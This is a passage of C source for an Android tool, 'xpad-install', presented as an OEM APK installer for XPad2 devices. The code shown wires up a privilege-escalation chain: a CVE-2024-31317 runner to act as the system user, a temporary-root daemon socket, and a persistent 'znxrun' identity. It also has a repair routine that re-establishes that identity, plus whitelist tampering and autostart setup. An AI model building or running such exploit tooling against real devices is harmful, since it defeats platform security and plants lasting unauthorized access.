  char *marker = strstr(tail, "__XPAD_IONSTACK_RC__");
  return marker ? atoi(marker + strlen("__XPAD_IONSTACK_RC__")) : 125;
}

static void usage(FILE *out) {
  fprintf(out,
      "xpad-install - single-file OEM APK installer for authorized XPad2 devices\n"
      "\n"
      "Usage:\n"
      "  xpad-install doctor\n"
      "  xpad-install install [--backend auto|provider|direct] APK\n"
      "  xpad-install upgrade [--backend auto|provider|direct] APK\n"
      "  xpad-install verify PACKAGE [VERSION_CODE]\n"
      "  xpad-install activate --starter=PATH --apk=MANAGER.apk\n"
      "  xpad-install autostart enable\n"
      "  xpad-install znxrun status\n"
      "  xpad-install znxrun ensure\n"
      "  xpad-install znxrun preflight\n"
      "  xpad-install znxrun create --package PACKAGE --apk UPDATE.apk [--apply]\n"
      "  xpad-install cleanup\n"
      "  xpad-install -h | --help\n"
      "\n"
      "APK placement:\n"
      "  Put APKs under /sdcard/Download so the znxxservice Provider can read them.\n"
      "\n"
      "Identity transports (selected automatically):\n"
      "  1. 0044 run-as znxrun (uid 10072) for auto/provider APK operations\n"
      "  2. IonStack temporary-root daemon at /data/local/tmp/temp_su.sock\n"
      "  3. CVE-2024-31317 uid=1000/system_app runner\n"
      "\n"
      "Backends:\n"
      "  auto      Prefer the OEM znxxservice Provider; use the safe fallback when valid.\n"
      "  provider  Ask the real znxxservice (UID 10072) to install the APK. Recommended.\n"
      "  direct    Create a PackageInstaller session as UID 1000. Not valid as UID 0.\n"
      "\n"
      "Examples:\n"
      "  adb push app.apk /sdcard/Download/app.apk\n"
      "  adb shell /data/local/tmp/xpad-install doctor\n"
      "  adb shell /data/local/tmp/xpad-install install /sdcard/Download/app.apk\n"
      "  adb shell /data/local/tmp/xpad-install verify com.example.app\n"
      "  adb shell /data/local/tmp/xpad-install autostart enable\n"
      "  adb shell /data/local/tmp/xpad-install znxrun status\n"
      "  adb shell /data/local/tmp/xpad-install znxrun ensure\n"
      "  adb shell /data/local/tmp/xpad-install znxrun preflight\n"
      "\n"
      "The tool restores hidden_api_blacklist_exemptions and removes temporary\n"
      "listeners/files after the 31317 transport exits. Root is not persistent.\n");
}

static int system_transport(int argc, char **argv) {
  if (acquire_31317() != 0) return 77;
  int rc = 74;
  if (transfer_dex_to_system() != 0) goto cleanup;
  int apk_index = apk_arg_index(argc - 1, argv + 1);
  int has_apk = apk_index >= 0;
  int native_apk_index = has_apk ? apk_index + 1 : -1;
  const char *provider_apk = has_apk ? argv[native_apk_index] : NULL;
  if (has_apk && transfer_apk_to_system(provider_apk) != 0) goto cleanup;
  char command[16384], quoted[2048];
  snprintf(command, sizeof(command),
           "CLASSPATH=%s:/system/app/pad2_znxxservice/pad2_znxxservice.apk "
           "XPAD_EMBEDDED_DEX=%s XPAD_TRANSPORT=31317",
           SYSTEM_DEX, SYSTEM_DEX);
  if (has_apk && (!strcmp(argv[1], "install") || !strcmp(argv[1], "upgrade"))) {
    shell_quote(quoted, sizeof(quoted), provider_apk);
    strlcat(command, " XPAD_PROVIDER_APK=", sizeof(command));
    strlcat(command, quoted, sizeof(command));
  }
  strlcat(command, " /system/bin/app_process / XpadInstaller", sizeof(command));
  for (int i = 1; i < argc; i++) {
    shell_quote(quoted, sizeof(quoted), has_apk && i == native_apk_index ? SYSTEM_APK : argv[i]);
    strlcat(command, " ", sizeof(command)); strlcat(command, quoted, sizeof(command));
  }
  rc = rpc(command, 300);

cleanup:
  rpc("for F in " SYSTEM_DEX ".pid " SYSTEM_APK ".pid; do "
      "[ -f \"$F\" ] && kill $(cat \"$F\") 2>/dev/null; done; "
      "rm -f " SYSTEM_DEX " " SYSTEM_APK " " SYSTEM_DEX ".pid " SYSTEM_APK ".pid", 10);
  cleanup_system_runner();
  cleanup_31317();
  int verify_znxrun = argc >= 4 && !strcmp(argv[1], "znxrun") &&
      (!strcmp(argv[2], "create") || !strcmp(argv[2], "ensure"));
  for (int i = 3; verify_znxrun && i < argc; i++)
    if (!strcmp(argv[i], "--apply")) {
      if (rc == 0 && system("/system/bin/run-as znxrun /system/bin/id") != 0) {
        fprintf(stderr, "xpad-install: 0044 commit returned success but run-as verification failed\n");
        return 1;
      }
      break;
    }
  return rc;
}

static const char *option_value(int argc, char **argv, const char *name) {
  for (int i = 1; i + 1 < argc; i++)
    if (!strcmp(argv[i], name)) return argv[i + 1];
  return NULL;
}

static int run_znxrun_mutation(int argc, char **argv, const char *package_name) {
  if (getuid() != 2000) {
    fprintf(stderr, "xpad-install: znxrun persistence maintenance requires adb shell uid 2000\n");
    return 77;
  }
  struct whitelist_guard guard;
  int rc = prepare_whitelist(package_name, &guard);
  if (rc != 0) {
    restore_whitelist(&guard);
    return rc;
  }
  pid_t child = fork();
  if (child < 0) {
    restore_whitelist(&guard);
    return 70;
  }
  if (child == 0) _exit(system_transport(argc, argv));

  struct sigaction action, old_hup, old_int, old_term;
  memset(&action, 0, sizeof(action));
  action.sa_handler = forward_guarded_signal;
  sigemptyset(&action.sa_mask);
  guarded_child = child;
  sigaction(SIGHUP, &action, &old_hup);
  sigaction(SIGINT, &action, &old_int);
  sigaction(SIGTERM, &action, &old_term);
  int status = 0;
  while (waitpid(child, &status, 0) < 0) {
    if (errno != EINTR) { status = -1; break; }
  }
  guarded_child = -1;
  sigaction(SIGHUP, &old_hup, NULL);
  sigaction(SIGINT, &old_int, NULL);
  sigaction(SIGTERM, &old_term, NULL);
  if (status < 0) rc = 127;
  else if (WIFEXITED(status)) rc = WEXITSTATUS(status);
  else rc = 128 + WTERMSIG(status);
  if (rc >= 128) {
    cleanup_system_runner();
    cleanup_31317();
    force_stop_package(PRIMARY_TRIGGER_PACKAGE);
    force_stop_package(SECONDARY_TRIGGER_PACKAGE);
  }
  int restore_rc = restore_whitelist(&guard);
  if (restore_rc != 0 && rc == 0) rc = restore_rc;
  return rc;
}

static int ensure_znxrun(const char *executable) {
  if (znxrun_status(0) == 0) {
    znxrun_status(1);
    puts("ZNXRUN_ENSURE result=unchanged");
    return 0;
  }
  if (write_file(ANCHOR_APK, xpad_anchor_start,
                 (size_t)(xpad_anchor_end - xpad_anchor_start), 0600) != 0) {
    fprintf(stderr, "xpad-install: cannot stage embedded installer anchor\n");
    return 74;
  }
  char *ensure_argv[] = {
    (char *)executable, "znxrun", "ensure", "--apk", ANCHOR_APK, "--apply", NULL
  };
  int rc = run_znxrun_mutation(6, ensure_argv, ANCHOR_PACKAGE);
  unlink(ANCHOR_APK);
  int status_rc = znxrun_status(1);
  if (rc == 0 && status_rc != 0) rc = 1;
  printf("ZNXRUN_ENSURE result=%s\n", rc == 0 ? "repaired" : "failed");
  return rc;
}

int main(int argc, char **argv) {
  if (argc >= 2 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h") ||
                    !strcmp(argv[1], "help"))) {
    usage(stdout);
    return 0;
  }
  if (argc == 1) {
    usage(stderr);
    return 64;
  }
  if (!strcmp(argv[1], "znxrun") && argc >= 3 && !strcmp(argv[2], "status")) {
    if (argc != 3) { usage(stderr); return 64; }
    return znxrun_status(1);
  }
  if (!strcmp(argv[1], "znxrun") && argc >= 3 && !strcmp(argv[2], "ensure")) {
    if (argc != 3) { usage(stderr); return 64; }
    return ensure_znxrun(argv[0]);
  }
  if (!strcmp(argv[1], "znxrun") && argc >= 3 && !strcmp(argv[2], "create")) {
    const char *package_name = option_value(argc - 1, argv + 1, "--package");
    if (!package_name || !*package_name) {
      fprintf(stderr, "xpad-install: generic znxrun create requires --package PACKAGE; "
                      "use 'znxrun ensure' for the managed anchor\n");
      return 64;
    }
    return run_znxrun_mutation(argc, argv, package_name);
  }
  if (!strcmp(argv[1], "doctor")) znxrun_status(1);
  if (argc >= 2 && !strcmp(argv[1], "--root-child")) {
    if (argc >= 3 && (!strcmp(argv[2], "activate") || !strcmp(argv[2], "serve"))) {
      return serve(argc - 2, argv + 2);
    }
    return ionstack_root_java(argc - 2, argv + 2);
  }
  if (!strcmp(argv[1], "serve")) return serve(argc - 1, argv + 1);
  if (!strcmp(argv[1], "autostart")) {
    if (argc != 3 || strcmp(argv[2], "enable")) {
      usage(stderr);
      return 64;
    }
    return configure_autostart();
  }
  if (!strcmp(argv[1], "activate")) {
    const char *starter, *apk;
    int valid = parse_service_args(argc - 1, argv + 1, &starter, &apk);
    if (valid != 0) return valid;
    int persistent = configure_autostart();
    if (persistent != 0) return persistent;
    if (getuid() == 0) return serve(argc - 1, argv + 1);
    int znxrun = activate_as_znxrun(argc - 1, argv + 1);
    if (znxrun >= 0) return znxrun;
    int root = ionstack_delegate(argc, argv);
    if (root >= 0) return root;
    return activate_as_system(argc - 1, argv + 1);
  }
  if (argc >= 3 && (!strcmp(argv[1], "install") || !strcmp(argv[1], "upgrade"))) {
    const char *backend = "auto";
    if (argc >= 5 && !strcmp(argv[2], "--backend")) backend = argv[3];
    if (strcmp(backend, "direct")) {
      if (getuid() == 2000 && znxrun_status(0) != 0) {
        fprintf(stderr, "xpad-install: repairing managed 0044 installer identity\n");
        if (ensure_znxrun(argv[0]) != 0)
          fprintf(stderr, "xpad-install: 0044 repair failed; trying safe fallback transport\n");
      }
      int znxrun = run_java_as_znxrun(argc - 1, argv + 1);
      if (znxrun == 0) {
        if (getuid() == 2000 && znxrun_status(0) != 0) {
          fprintf(stderr, "xpad-install: APK commit degraded 0044 persistence; repairing\n");
          if (ensure_znxrun(argv[0]) != 0)
            fprintf(stderr, "xpad-install: APK installed but 0044 persistence is degraded\n");
        }
        return 0;
      }
      if (znxrun > 0) {
        fprintf(stderr, "xpad-install: 0044 APK path failed; using safe uid 1000 fallback\n");
      }
    }
  }
  if (getuid() == 0) {
    return ionstack_root_java(argc - 1, argv + 1);
  }
  int root = ionstack_delegate(argc, argv);
  if (root >= 0) return root;
  return system_transport(argc, argv);
}
